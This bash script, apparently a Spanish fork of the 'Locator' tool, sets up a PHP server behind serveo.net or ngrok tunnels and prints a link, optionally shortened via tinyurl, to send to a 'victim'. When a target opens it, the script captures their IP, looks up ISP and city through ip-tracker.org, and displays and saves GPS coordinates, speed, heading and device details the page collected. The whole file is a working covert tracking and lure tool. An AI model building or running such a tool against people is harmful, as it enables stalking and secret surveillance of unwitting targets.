#!/bin/bash
# Locator v1.0
# Coded by: thelinuxchoice (You dont become a coder by just changing the credits)
# Github: https://github.com/thelinuxchoice/locator

trap 'printf "\n";stop;exit 1' 2


dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "Necesito php pero no esta instalado. Instalarlo. Abortar"; exit 1; }



command -v curl > /dev/null 2>&1 || { echo >&2 "Necesito curl pero no esta instalado. Instalarlo. Abortar"; exit 1; }

}


stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi



}


start_local(){
def_port="8080"
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
read port
port="${port:-${def_port}}"
printf "\e[0m\n"
printf "\e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalHostRun ..\e[0m\n"
printf "\n"
if [[ -e linksender ]]; then
rm -rf linksender
fi
printf " \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to exit.\e[0m\n"
printf "\e[1;93m\n"
ssh -R 80:localhost:8080 ssh.localhost.run 2>&1
printf "\e[0m\n"
}
found() {
printf "\n"
printf "\n \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to exit.\e[0m\n"
while [ true ]; do
sleep 0.75
done
}

catch_cred() {

longitude=$(grep -o 'Longitude:.*' server/geolocate.txt | cut -d " " -f2 | tr -d ' ')
IFS=$'\n'
latitude=$(grep -o 'Latitude:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
altitude=$(grep -o 'Altitude:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
accuracy=$(grep -o 'Accuracy:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
hardware=$(grep -o 'Cores:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
speed=$(grep -o 'Speed:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
platform=$(grep -o 'Platform:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
heading=$(grep -o 'Heading:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
memory=$(grep -o 'Memory:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
useragent=$(grep -o 'User-Agent:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
height=$(grep -o 'Screen Height:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
width=$(grep -o 'Screen Width:.*' server/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
echo -e  "\033[0;34m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[0m"
printf "\e[1;92m[\e[0m\e[1;77m:::\e[0m\e[1;92m]\e[0m\e[1;93m Geolocation:\n"
echo -e  "\033[0;34m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[0m"
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Latitude:\e[0m\e[1;77m %s\n\e[0m" $latitude
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Longitude:\e[0m\e[1;77m %s\n\e[0m" $longitude
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Altitude:\e[0m\e[1;77m %s\n\e[0m" $altitude
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Speed:\e[0m\e[1;77m %s\n\e[0m" $speed
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Heading:\e[0m\e[1;77m %s\n\e[0m" $heading
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Accuracy:\e[0m\e[1;77m %sm\n\e[0m" $accuracy
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Map:\e[0m\e[1;77m https://www.google.com/maps/place/%s+%s\n\e[0m" $latitude $longitude
echo -e  "\033[0;34m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[0m"
printf "\e[1;92m[\e[0m\e[1;77m:::\e[0m\e[1;92m]\e[0m\e[1;93m Device Info:\n"
echo -e  "\033[0;34m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[0m"
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Platform:\e[0m\e[1;77m %s\n\e[0m" $platform
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Cores:\e[0m\e[1;77m %s\n\e[0m" $hardware
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m User-Agent:\e[0m\e[1;77m %s\n\e[0m" $useragent
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Memory:\e[0m\e[1;77m %s\n\e[0m" $memory
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Resolution:\e[0m\e[1;77m %sx%s\n\e[0m" $height $width
cat server/geolocate.txt >> server/saved.geolocate.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m server/saved.geolocate.txt\e[0m\n" 
killall -2 php > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
killall ssh > /dev/null 2>&1
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
exit 1

}

getcredentials() {
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Geolocalizacion en espera ...\e[0m\n"
while [ true ]; do


if [[ -e "server/geolocate.txt" ]]; then
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Geolocalizacion encontrada!\n"
catch_cred

fi
sleep 0.5
if [[ -e "server/error.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m ¡Error en la geolocalizacion!!\n"
checkerror=$(grep -o 'Error:.*' server/error.txt | cut -d " " -f2 | tr -d ' ' )
if [[ $checkerror == 1 ]]; then
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Usuario denego geolocalizacion ...\e[0m\n"

rm -rf server/error.txt
getcredentials
elif [[ $checkerror == 2 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Geolocalizacion no disponible ...\e[0m\n"

rm -rf server/error.txt
getcredentials
elif [[ $checkerror == 3 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Se acabo el tiempo ...\e[0m\n"

rm -rf server/error.txt
getcredentials
elif [[ $checkerror == 4 ]]; then
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Error desconocido ...\e[0m\n"

rm -rf server/error.txt
getcredentials
else
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Error al leer el archivo error.txt...\e[0m\n"
exit 1
fi
fi
sleep 0.5



done 


}

catch_ip() {
echo -e  "\033[0;34m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[0m"
touch server/saved.geolocate.txt
ip=$(grep -a 'IP:' server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' server/ip.txt | cut -d '"' -f2)
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Target IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Saved:\e[0m\e[1;77m server/saved.ip.txt\e[0m\n"
cat server/ip.txt >> server/saved.ip.txt
echo -e  "\033[0;34m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[0m"

if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
echo -e  "\033[0;34m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[0m"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
echo -e  "\033[0;34m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[0m"
rm -rf iptracker.log

getcredentials
}

##
serverx() {
printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
php -t "server/" -S 127.0.0.1:$port > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
sleep 4 # &
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
checkfound


}

startx() {
if [[ -e server/ip.txt ]]; then
rm -rf server/ip.txt

fi
if [[ -e server/geolocate.txt ]]; then
rm -rf server/geolocate.txt

fi

if [[ -e server/error.txt ]]; then
rm -rf server/error.txt

fi

default_port=$(seq 1111 4444 | sort -R | head -n1)
printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;92m): \e[0m' $default_port
read port
port="${port:-${default_port}}"
serverx

}

start() {
if [[ -e server/ip.txt ]]; then
rm -rf server/ip.txt

fi
if [[ -e server/geolocate.txt ]]; then
rm -rf server/geolocate.txt

fi

if [[ -e server/error.txt ]]; then
rm -rf server/error.txt

fi
if [[ -e ngrok ]]; then
echo ""
else
echo -e  "\033[0;34m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[0m"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m DESCARGANDO NGROK\e[0m\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Instale todos los paquetes\e[0m\n"
exit 1
fi
else
curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Error \e[1;31m[\e[0m\e[1;77m!\e[0m\e[1;31m]\e[0m\e[1;96m Instale todos los paquetes\e[0m\n"
exit 1
fi
fi
fi
echo -e  "\033[0;34m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[0m"
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Lanzando Ngrok ..\e[0m\n"
php -t "server/" -S 127.0.0.1:5555 > /dev/null 2>&1 &
sleep 2
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Iniciando el servidor ngrok....\n"
./ngrok http 5555 > /dev/null 2>&1 &
sleep 10
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Enviar el enlace a la víctima :\e[0m\e[1;96m %s \n" $link
checkfound
}
##

selection_fun () {
local selection="null"
local range
for((i=0; i<=$1; i++)); do range[$i]="$i "; done
while [[ ! $(echo ${range[*]}|grep -w "$selection") ]]; do
echo -ne "\033[1;37mSelecione una Opcion: " >&2
read selection
tput cuu1 >&2 && tput dl1 >&2
done
echo $selection
}

start1() {
option_server="${option_server:-${default_option_server}}"
default_option_server="1"
echo -e " "
echo -e "\033[0;37m Elija una opcion de reenvio de puertos: \033[0m"
echo -e  "\033[0;34m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[0m"
echo -e "\033[1;31m[\033[1;32m01\033[1;31m]\033[1;37m Serveo.net (SSH Tunelling, Best!)\033[0m"
echo -e "\033[1;31m[\033[1;32m02\033[1;31m]\033[1;37m Ngrok\033[0m"
echo -e "\033[0;34m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[0m"
selection=$(selection_fun 2)
case ${selection} in
1)
start_local
;;
2)
start
esac
}
checkfound() {

printf "\e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Esperando objetivo abra el enlace ...\e[0m\n"
while [ true ]; do


if [[ -e "server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP encontrada!\n"
catch_ip

fi
sleep 1
done 

}

banner() {

printf "\e[1;93m  _                                                \e[0m\n"
printf "\e[1;93m (_)                             \e[0m\e[1;77m_                 \e[0m\n"
printf "\e[1;77m  _        ___    ____  _____  _| |_  ___    ____  \e[0m\n"
printf "\e[1;77m | |      / _ \  / ___)(____ |(_   _)/ _ \  / ___) \e[0m\n"
printf "\e[1;77m | |_____| |_| |( (___ / ___ |  | |_| |_| || |     \e[0m\n"
printf "\e[1;77m |_______)\___/  \____)\_____|   \__)\___/ |_|    v1.0 \e[0m\n"
printf "\n"
printf "\e[1;93m :::\e[0m\e[1;77m Coded by: @JorgeBarba\e[0m\n"

}
banner
dependencies
start1

